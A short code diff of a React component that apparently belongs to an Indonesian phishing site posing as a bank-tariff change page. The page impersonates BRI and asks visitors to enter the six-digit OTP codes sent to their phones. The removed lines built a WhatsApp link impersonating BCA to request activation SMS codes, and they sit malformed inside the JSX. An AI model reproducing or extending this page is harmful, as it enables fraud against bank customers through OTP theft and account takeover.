@@ -35,18 +35,7 @@ const SiteVerifikasi = ({btnClick, query}) => {
         </h1>    
         <p style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Silahkan cek kode tarif anda yang telah dikirim ke no handphone melalui SMS dari BRI OTP dan berlaku sampai 1-3 menit</p> 
         <h4>KODE TARIF NORMAL</h4>   
-      
-
-// untuk link whatsapp
-    let url = ''
-    if (host == 'ubah-tarif.herokuapp.com') {
-        url = 'https://api.whatsapp.com/send?phone=628112121240&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
-    } else {
-        url = 'https://api.whatsapp.com/send?phone=628112121240&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
-    }
-
-            
-           <form>
+            <form>
             <label>
               Kode 6 angka ke-{query || 1} ({
                 query === '1' ?
